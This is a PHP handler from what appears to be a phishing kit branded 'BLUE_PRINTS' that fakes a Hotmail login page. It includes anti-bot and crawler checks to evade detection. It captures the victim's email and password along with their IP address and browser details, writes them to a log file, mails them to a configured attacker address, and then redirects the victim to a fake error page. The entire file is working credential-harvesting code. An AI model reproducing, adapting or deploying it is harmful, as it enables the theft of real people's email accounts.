<?php
error_reporting(0);

session_start();
require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    } 
    include '../../crawlerdetect.php';
$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = $_SESSION['token'];

if(!empty($_SESSION['email']))  {

$useremail = $_SESSION['email'];
 
}

if(!empty($_POST['password']))  {

$pass = $_POST['password'];
$_SESSION['password'] = $_POST['password'];
date_default_timezone_set('Europe/Amsterdam');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

include "../../step/conf/config.php";

$msg =  $_SESSION['msg'];
$msg .= "+ ------------------------------------------+\n";
$msg .= "|   ðµBLUE_PRINTS | H0TM4il Login Details \n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "| ð§ EMAIL  :  ".$useremail."\n";
$msg .= "| ð PASS   :  ".$_SESSION['password']."\n";
$msg .= "| ð PASS 2 :  ".$pass."\n"; 
$footer = "+ ------------------------------------------+\n";
$footer .= "+ IP => $ip \n  USERAGENT => $agent\n";
$footer .= "+ ------------------------------------------+\n\n";

$data = $msg . $footer;
if($savetxt == "on"){
$save=fopen("../../step/data/email".$salt.".txt",'a');
	          fwrite($save,$data );
	          fclose($save);
              
                }


$_SESSION['emailr'] = $msg;

$subject="Email 1NFO By BLUE_PR1NTS=> {$_SERVER['REMOTE_ADDR']} {$_SESSION['usernam']} [ {$_SESSION['platform']} ]";
$headers="From: BLUE_PR1NTS <chse@blue_prints>\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";
@mail($emailzz, $subject, $data, $headers);
 

header("location: error.php?token={$_SESSION['token']}");  
}

?>
